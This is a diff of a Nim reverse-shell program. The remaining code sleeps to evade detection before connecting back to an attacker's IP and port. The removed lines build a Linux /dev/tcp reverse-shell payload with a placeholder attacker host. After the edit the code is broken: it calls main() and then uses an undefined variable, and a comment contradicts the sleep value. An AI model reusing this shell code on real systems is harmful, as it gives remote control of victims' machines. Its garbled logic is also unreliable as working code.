@@ -1,8 +1,8 @@
 import std/net, osproc, os, strformat
 
-proc windows() =
-  # Sleep for 20,000 milliseconds (20 seconds) to potentially evade detection
-  sleep(20000)
+proc main() =
+  # Sleep for 30,000 milliseconds (20 seconds) to potentially evade detection
+  sleep(30000)
 
   # Define the attacker's IP address and port number
   let
@@ -45,21 +45,7 @@ proc windows() =
       except OSError:
         quit("Failed to close the socket")
 
-proc linux() = 
-  let 
-    ip = "Attacker ip"
-    port = 1234
-
-  let payload = fmt"sh -i >& /dev/tcp/{ip}/{port} 0>&1"
-  echo payload
-
-proc main() = 
-  if system.hostOs == "windows":
-    windows()
-  if system.hostOs == "linux":
-    linux()
-  else:
-    let execpath = getAppFilename()
+main()
     removeFile(execpath)
     quit("Unsupported operating system")
 
